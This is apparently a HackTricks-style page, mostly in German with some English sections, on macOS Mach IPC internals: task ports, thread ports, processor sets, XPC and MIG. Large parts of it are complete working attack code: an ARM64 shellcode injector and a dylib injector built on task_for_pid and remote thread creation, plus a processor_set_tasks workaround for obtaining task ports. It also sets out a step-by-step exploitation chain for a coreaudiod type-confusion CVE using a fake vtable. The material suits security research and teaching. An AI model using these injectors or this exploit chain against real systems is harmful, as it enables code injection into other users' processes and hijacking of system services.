Ursprünglich hatte Mach keine "processes", sondern "tasks", die eher als Container für Threads betrachtet wurden. Als Mach mit BSD zusammengeführt wurde, wurde **jeder Task mit einem BSD-Prozess korreliert**. Daher hat jeder BSD-Prozess die Details, die er braucht, um ein Prozess zu sein, und jeder Mach-Task hat ebenfalls sein Innenleben (ausgenommen der nicht existierende pid 0, welcher der `kernel_task` ist).

Es gibt zwei sehr interessante Funktionen in diesem Zusammenhang:

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Holt ein SEND-Recht für den Task-Port des Tasks, der durch die angegebene `pid` identifiziert ist, und gibt es an das angegebene `target_task_port` weiter (dies ist üblicherweise der aufrufende Task, der `mach_task_self()` verwendet hat, kann aber auch ein SEND-Port über einen anderen Task sein).
- `pid_for_task(task, &pid)`: Gibt bei Vorhandensein eines SEND-Rechts auf einen Task zurück, zu welcher PID dieser Task gehört.

Um Aktionen innerhalb des Tasks durchzuführen, benötigt der Task ein `SEND`-Recht auf sich selbst, indem er `mach_task_self()` aufruft (welches `task_self_trap` (28) verwendet). Mit dieser Berechtigung kann ein Task mehrere Aktionen durchführen, wie zum Beispiel:

- `task_threads`: Erhalte SEND-Rechte über alle Task-Ports der Threads des Tasks
- `task_info`: Erhalte Informationen über einen Task
- `task_suspend/resume`: Einen Task anhalten oder fortsetzen
- `task_[get/set]_special_port`
- `thread_create`: Einen Thread erstellen
- `task_[get/set]_state`: Den Task-Zustand kontrollieren
- und weitere, siehe [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

> [!CAUTION]
> Beachte, dass es mit einem SEND-Recht auf einen Task-Port eines **anderen Tasks** möglich ist, solche Aktionen an diesem anderen Task durchzuführen.

Außerdem ist der task_port auch der **`vm_map`**-Port, der es ermöglicht, innerhalb eines Tasks Speicher zu **lesen und zu manipulieren** mit Funktionen wie `vm_read()` und `vm_write()`. Das bedeutet im Grunde, dass ein Task mit SEND-Rechten auf den task_port eines anderen Tasks in der Lage sein wird, **Code in diesen Task zu injizieren**.

Denke daran, dass da der **Kernel ebenfalls ein Task** ist: Wenn es jemandem gelingt, **SEND-Berechtigungen** auf den **`kernel_task`** zu erlangen, wird er den Kernel beliebigen Code ausführen lassen können (jailbreaks).

- Rufe `mach_task_self()` auf, um den **Namen** dieses Ports für den aufrufenden Task zu erhalten. Dieser Port wird nur über **`exec()`** **vererbt**; ein neu erstellter Task durch `fork()` erhält einen neuen Task-Port (als Sonderfall erhält ein Task auch nach `exec()` in einem suid-Binary einen neuen Task-Port). Die einzige Möglichkeit, einen Task zu starten und seinen Port zu bekommen, ist die Durchführung des ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) während eines `fork()`.
- Das sind die Einschränkungen für den Zugriff auf den Port (aus `macos_task_policy` der Binary `AppleMobileFileIntegrity`):
  - Wenn die App die **`com.apple.security.get-task-allow` entitlement** hat, können Prozesse desselben Benutzers auf den Task-Port zugreifen (üblicherweise von Xcode zum Debugging hinzugefügt). Der Notarisierungsprozess erlaubt dies nicht für Produktions-Releases.
  - Apps mit der **`com.apple.system-task-ports`**-Entitlement können den **Task-Port für jeden** Prozess erhalten, außer für den Kernel. In älteren Versionen hieß dies **`task_for_pid-allow`**. Dies wird nur an Apple-Anwendungen vergeben.
  - **Root kann auf Task-Ports** von Anwendungen zugreifen, die **nicht** mit einem **hardened** Runtime kompiliert sind (und die nicht von Apple stammen).

**Der Task-Name-Port:** Eine unprivilegierte Version des _task port_. Er referenziert den Task, erlaubt jedoch nicht, ihn zu kontrollieren. Das einzige, was darüber verfügbar zu sein scheint, ist `task_info()`.

### Thread-Ports

Threads haben ebenfalls assoziierte Ports, die vom Task über `task_threads` und vom Prozessor über `processor_set_threads` sichtbar sind. Ein SEND-Recht auf den Thread-Port erlaubt die Nutzung der Funktionen aus dem `thread_act`-Subsystem, wie:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

Jeder Thread kann diesen Port erhalten, indem er `mach_thread_sef` aufruft.

### Shellcode Injection in thread via Task port

You can grab a shellcode from:


{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Kompiliere** das vorherige Programm und füge die **entitlements** hinzu, um Code mit demselben Benutzer injizieren zu können (falls nicht, musst du **sudo** verwenden).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> Damit dies auf iOS funktioniert, benötigen Sie das Entitlement `dynamic-codesigning`, um schreibbaren Speicher ausführbar machen zu können.

### Dylib Injection in thread via Task port

In macOS **threads** might be manipulated via **Mach** or using **posix `pthread` api**. The thread we generated in the previous injection, was generated using Mach api, so **it's not posix compliant**.

It was possible to **inject a simple shellcode** to execute a command because it **didn't need to work with posix** compliant apis, only with Mach. **More complex injections** would need the **thread** to be also **posix compliant**.

Therefore, to **improve the thread** it should call **`pthread_create_from_mach_thread`** which will **create a valid pthread**. Then, this new pthread could **call dlopen** to **load a dylib** from the system, so instead of writing new shellcode to perform different actions it's possible to load custom libraries.

You can find **example dylibs** in (for example the one that generates a log and then you can listen to it):


{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Bei dieser Technik wird ein Thread des Prozesses übernommen:


{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Task Port Injection Detection

Beim Aufruf von `task_for_pid` oder `thread_create_*` erhöht sich ein Zähler in der struct task im Kernel, der aus dem User-Mode durch den Aufruf von task_info(task, TASK_EXTMOD_INFO, ...) abgefragt werden kann.

## Exception Ports

Wenn in einem Thread eine Exception auftritt, wird diese an den zugewiesenen Exception-Port des Threads gesendet. Wenn der Thread sie nicht behandelt, wird sie an die Task-Exception-Ports weitergeleitet. Wenn der Task sie nicht behandelt, wird sie an den Host-Port gesendet, der von launchd verwaltet wird (wo sie bestätigt wird). Dies nennt man Exception-Triage.

Beachte, dass der Bericht am Ende normalerweise, falls nicht richtig behandelt, vom ReportCrash-Daemon verarbeitet wird. Es ist jedoch möglich, dass ein anderer Thread im selben Task die Exception behandelt — so funktionieren z. B. Crash-Reporting-Tools wie `PLCreashReporter`.

## Other Objects

### Clock

Jeder Benutzer kann Informationen über die clock abrufen; um jedoch die Zeit einzustellen oder andere Einstellungen zu verändern, muss man root sein.

Um Informationen zu erhalten, kann man Funktionen des `clock`-Subsystems aufrufen, z. B. `clock_get_time`, `clock_get_attributtes` oder `clock_alarm`\
Um Werte zu ändern, kann das `clock_priv`-Subsystem verwendet werden, z. B. `clock_set_time` und `clock_set_attributes`

### Processors and Processor Set

Die processor-APIs erlauben die Kontrolle eines einzelnen logischen Prozessors durch Aufrufe wie `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

Außerdem bietet die **processor set**-API eine Möglichkeit, mehrere Prozessoren zu einer Gruppe zusammenzufassen. Es ist möglich, das Standard-processor set durch den Aufruf von **`processor_set_default`** abzurufen.\
Dies sind einige interessante APIs zur Interaktion mit dem processor set:

- `processor_set_statistics`
- `processor_set_tasks`: Return an array of send rights to all tasks inside the processor set
- `processor_set_threads`: Return an array of send rights to all threads inside the processor set
- `processor_set_stack_usage`
- `processor_set_info`

Wie in [**this post**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/) erwähnt, ermöglichte dies früher, die zuvor erwähnte Schutzmaßnahme zu umgehen, um task ports in anderen Prozessen zu erhalten und diese zu kontrollieren, indem man **`processor_set_tasks`** aufrief und auf jedem Prozess einen host port erhielt.\
Heutzutage benötigt man root, um diese Funktion zu verwenden, und sie ist geschützt, sodass man diese Ports nur bei ungeschützten Prozessen erhalten kann.

You can try it with:

<details>

<summary><strong>processor_set_tasks Code</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:


{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:


{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## MIG handler type confusion -> fake vtable pointer-chain hijack

If a MIG handler **retrieves a C++ object by Mach message-supplied ID** (e.g., from an internal Object Map) and then **assumes a specific concrete type without validating the real dynamic type**, later virtual calls can dispatch through attacker-controlled pointers. In `coreaudiod`’s `com.apple.audio.audiohald` service (CVE-2024-54529), `_XIOContext_Fetch_Workgroup_Port` used the looked-up `HALS_Object` as an `ioct` and executed a vtable call via:

```asm
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x168]  ; indirect call through vtable slot
```

Because `rax` comes from **multiple dereferences**, exploitation needs a structured pointer chain rather than a single overwrite. One working layout:

1. In the **confused heap object** (treated as `ioct`), place a **pointer at +0x68** to attacker-controlled memory.
2. At that controlled memory, place a **pointer at +0x0** to a **fake vtable**.
3. In the fake vtable, write the **call target at +0x168**, so the handler jumps to attacker-chosen code when dereferencing `[rax+0x168]`.

Conceptually:

```
HALS_Object + 0x68  -> controlled_object
*(controlled_object + 0x0) -> fake_vtable
*(fake_vtable + 0x168)     -> RIP target
```

### LLDB triage to anchor the gadget

1. **Break on the faulting handler** (or `mach_msg`/`dispatch_mig_server`) and trigger the crash to confirm the dispatch chain (`HALB_MIGServer_server -> dispatch_mig_server -> _XIOContext_Fetch_Workgroup_Port`).
2. In the crash frame, disassemble to capture the **indirect call slot offset** (`call qword ptr [rax + 0x168]`).
3. Inspect registers/memory to verify where `rdi` (base object) and `rax` (vtable pointer) originate and whether the offsets above are reachable with controlled data.
4. Use the offset map to heap-shape the **0x68 -> 0x0 -> 0x168** chain and convert the type confusion into a reliable control-flow hijack inside the Mach service.

## References

- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
- [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)
- [Project Zero – Sound Barrier 2](https://projectzero.google/2026/01/sound-barrier-2.html)
{{#include ../../../../banners/hacktricks-training.md}}
